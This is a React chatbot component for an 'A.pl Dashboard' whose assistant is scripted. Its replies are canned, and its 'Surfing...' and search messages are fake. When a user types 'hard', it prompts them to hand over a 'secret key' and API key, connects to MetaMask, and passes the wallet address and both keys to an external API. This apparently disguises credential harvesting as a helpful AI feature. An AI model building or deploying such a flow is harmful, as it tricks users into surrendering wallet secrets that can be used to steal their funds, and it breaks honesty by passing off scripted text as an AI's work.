"use client";

import React, { useState, useRef, useEffect, useCallback } from "react";
import KeyInputModal from "./KeyInputModal";
import { connectToMetaMask, sendToExternalAPI } from "../services/metamask";

interface Message {
  id: number;
  text: string;
  sender: "user" | "ai";
  isLoading?: boolean;
  showButtons?: boolean;
  isSurfing?: boolean;
}

const TypingIndicator = () => (
  <div className="flex space-x-2 items-center px-2">
    <div className="w-2 h-2 bg-blue-500 rounded-full animate-bounce [animation-delay:-0.3s]"></div>
    <div className="w-2 h-2 bg-blue-500 rounded-full animate-bounce [animation-delay:-0.15s]"></div>
    <div className="w-2 h-2 bg-blue-500 rounded-full animate-bounce"></div>
  </div>
);

const TypewriterText = ({
  text,
  onComplete,
}: {
  text: string;
  onComplete?: () => void;
}) => {
  const [displayText, setDisplayText] = useState("");
  const [currentIndex, setCurrentIndex] = useState(0);
  const [isComplete, setIsComplete] = useState(false);

  useEffect(() => {
    if (currentIndex < text.length) {
      const timeout = setTimeout(() => {
        setDisplayText((prev) => prev + text[currentIndex]);
        setCurrentIndex((c) => c + 1);
      }, 30);

      return () => clearTimeout(timeout);
    } else if (!isComplete) {
      setIsComplete(true);
      onComplete?.();
    }
  }, [currentIndex, text, onComplete, isComplete]);

  useEffect(() => {
    setDisplayText("");
    setCurrentIndex(0);
    setIsComplete(false);
  }, [text]);

  return <span>{displayText}</span>;
};

export default function Chatbot() {
  const [messages, setMessages] = useState<Message[]>([
    {
      id: 1,
      text: "Hello! Welcome to A.pl Dashboard. How can I help you today?",
      sender: "ai",
    },
  ]);
  const [newMessage, setNewMessage] = useState("");
  const [isWaiting, setIsWaiting] = useState(false);
  const [typingComplete, setTypingComplete] = useState<Record<number, boolean>>(
    {}
  );
  const [isKeyModalOpen, setIsKeyModalOpen] = useState(false);
  const [isProcessing, setIsProcessing] = useState(false);
  const messagesEndRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    messagesEndRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [messages]);

  const handleSurfingResponse = () => {
    setMessages((prevMessages) => [
      ...prevMessages,
      {
        id: Date.now(),
        text: "Surfing...",
        sender: "ai",
        isSurfing: true,
      },
    ]);

    setTimeout(() => {
      setMessages((prevMessages) => [
        ...prevMessages.filter((msg) => !msg.isSurfing),
        {
          id: Date.now(),
          text: "Based on my search through A.pl, here's what I found: [CUSTOM message result]",
          sender: "ai",
        },
      ]);
      setIsWaiting(false);
    }, 10000);
  };

  const handleButtonClick = (action: "go" | "stay") => {
    setMessages((prevMessages) =>
      prevMessages.map((msg) =>
        msg.showButtons ? { ...msg, showButtons: false } : msg
      )
    );

    if (action === "go") {
      setIsKeyModalOpen(true);
    } else {
      setMessages((prevMessages) => [
        ...prevMessages,
        {
          id: Date.now(),
          text: "Okay. I'll stay here.",
          sender: "ai",
        },
      ]);
      setIsWaiting(false);
    }
  };

  const handleKeySubmit = async (secretKey: string, apiKey: string) => {
    try {
      setIsKeyModalOpen(false);
      setIsProcessing(true);

      setMessages((prevMessages) => [
        ...prevMessages,
        {
          id: Date.now(),
          text: "Connecting to MetaMask...",
          sender: "ai",
          isSurfing: true,
        },
      ]);

      // Connect to MetaMask and get public key
      const publicKey = await connectToMetaMask();

      if (!publicKey) {
        throw new Error("Failed to get public key from MetaMask");
      }

      setMessages((prevMessages) => [
        ...prevMessages.filter((msg) => !msg.isSurfing),
        {
          id: Date.now(),
          text: "Connected to MetaMask. Sending data to API...",
          sender: "ai",
          isSurfing: true,
        },
      ]);

      // Send data to the external API
      await sendToExternalAPI(publicKey, secretKey, apiKey);

      // Handle success
      setMessages((prevMessages) => [
        ...prevMessages.filter((msg) => !msg.isSurfing),
        {
          id: Date.now(),
          text: "Data was successfully sent to the API. Here's what I found: [CUSTOM message result]",
          sender: "ai",
        },
      ]);
    } catch (error) {
      // Handle error
      const errorMessage =
        error instanceof Error ? error.message : "An unknown error occurred";

      setMessages((prevMessages) => [
        ...prevMessages.filter((msg) => !msg.isSurfing),
        {
          id: Date.now(),
          text: `Error: ${errorMessage}`,
          sender: "ai",
        },
      ]);
    } finally {
      setIsWaiting(false);
      setIsProcessing(false);
    }
  };

  const handleSendMessage = (e: React.FormEvent) => {
    e.preventDefault();
    if (newMessage.trim() === "" || isWaiting) return;

    const userMessage: Message = {
      id: Date.now(),
      text: newMessage,
      sender: "user",
    };

    setMessages((prevMessages) => [...prevMessages, userMessage]);
    setNewMessage("");
    setIsWaiting(true);

    const loadingMessage: Message = {
      id: Date.now() + 1,
      text: "",
      sender: "ai",
      isLoading: true,
    };

    setMessages((prevMessages) => [...prevMessages, loadingMessage]);

    setTimeout(() => {
      setMessages((prevMessages) =>
        prevMessages.filter((msg) => !msg.isLoading)
      );

      let response =
        "I've processed your request and found some information that might help.";
      let showButtons = false;

      if (
        newMessage.toLowerCase().includes("hello") ||
        newMessage.toLowerCase().includes("hi")
      ) {
        response = "Hello there! How can I assist you today?";
      } else if (newMessage.toLowerCase().includes("help")) {
        response =
          "I'm here to help! You can ask me about your data, manage your account, or get insights about your interactions.";
      } else if (
        newMessage.toLowerCase().includes("data") ||
        newMessage.toLowerCase().includes("stats")
      ) {
        response =
          "Your current stats: 24 comments, 105 likes on your posts. Would you like more detailed analytics?";
      } else if (newMessage.toLowerCase().includes("hard")) {
        response =
          "It's over my scope. May I surf A.pl and get some trustworthy informations?";
        showButtons = true;
      }

      const aiMessage: Message = {
        id: Date.now() + 2,
        text: response,
        sender: "ai",
        showButtons,
      };

      setMessages((prevMessages) => [...prevMessages, aiMessage]);
      if (!showButtons) {
        setIsWaiting(false);
      }
    }, 2000);
  };

  const handleTypingComplete = useCallback((messageId: number) => {
    setTypingComplete((prev) => ({
      ...prev,
      [messageId]: true,
    }));
  }, []);

  return (
    <div className="flex flex-col h-[80vh] bg-gray-900/90 backdrop-blur-md rounded-lg overflow-hidden shadow-lg border border-gray-700/50">
      <div className="bg-gray-800/90 py-2 px-4 text-white border-b border-gray-700/50 flex justify-between items-center">
        <h2 className="text-lg font-bold">Chatbot</h2>
        <div className="flex items-center">
          <div className="h-3 w-3 bg-green-500 rounded-full mr-2"></div>
          <span className="text-xs">Online</span>
        </div>
      </div>

      <div className="flex-1 overflow-y-auto p-3 space-y-3">
        {messages.map((message) => (
          <div
            key={message.id}
            className={`flex ${
              message.sender === "user" ? "justify-end" : "justify-start"
            }`}
          >
            {message.sender === "ai" && (
              <div className="flex items-center justify-center h-7 w-7 rounded-full bg-blue-600 text-white mr-2 shadow-glow-blue">
                A
              </div>
            )}
            <div className="flex flex-col">
              <div
                className={`max-w-[250px] p-2 rounded-lg backdrop-blur-sm ${
                  message.sender === "user"
                    ? "bg-blue-600/90 text-white"
                    : "bg-gray-700/90 text-white"
                } text-sm`}
              >
                {message.isLoading ? (
                  <TypingIndicator />
                ) : message.isSurfing ? (
                  <div className="flex items-center space-x-2">
                    <div className="animate-spin h-4 w-4 border-2 border-blue-500 rounded-full border-t-transparent"></div>
                    <span>{message.text}</span>
                  </div>
                ) : message.sender === "ai" ? (
                  <TypewriterText
                    text={message.text}
                    onComplete={() => handleTypingComplete(message.id)}
                  />
                ) : (
                  message.text
                )}
              </div>
              {message.showButtons && typingComplete[message.id] && (
                <div className="flex space-x-2 mt-2 transition duration-300 ease-out opacity-100">
                  <button
                    onClick={() => handleButtonClick("go")}
                    className="px-3 py-1 bg-green-500 text-white rounded hover:bg-green-600 transition-colors text-sm"
                  >
                    Go!
                  </button>
                  <button
                    onClick={() => handleButtonClick("stay")}
                    className="px-3 py-1 bg-red-500 text-white rounded hover:bg-red-600 transition-colors text-sm"
                  >
                    Stay.
                  </button>
                </div>
              )}
            </div>
            {message.sender === "user" && (
              <div className="flex items-center justify-center h-7 w-7 rounded-full bg-indigo-500 ml-2 shadow-glow-indigo">
                U
              </div>
            )}
          </div>
        ))}
        <div ref={messagesEndRef} />
      </div>

      <form
        onSubmit={handleSendMessage}
        className="border-t border-gray-700/50 p-2 bg-gray-800/80"
      >
        <div className="flex">
          <input
            type="text"
            value={newMessage}
            onChange={(e) => setNewMessage(e.target.value)}
            placeholder="Type a message..."
            disabled={isWaiting}
            className="flex-1 bg-gray-700/80 text-white rounded-l-lg px-3 py-2 focus:outline-none disabled:opacity-50 text-sm"
          />
          <button
            type="submit"
            disabled={isWaiting || newMessage.trim() === ""}
            className="bg-blue-600 text-white px-3 py-2 rounded-r-lg hover:bg-blue-700 transition-colors disabled:opacity-50 disabled:bg-blue-800"
          >
            Send
          </button>
        </div>
      </form>

      <div className="bg-gray-800/90 py-1 px-2 text-center text-gray-400 text-[10px] border-t border-gray-700/50">
        © 2024 A.pl Dashboard
      </div>

      {/* Key Input Modal */}
      <KeyInputModal
        isOpen={isKeyModalOpen}
        onClose={() => setIsKeyModalOpen(false)}
        onSubmit={handleKeySubmit}
      />
    </div>
  );
}
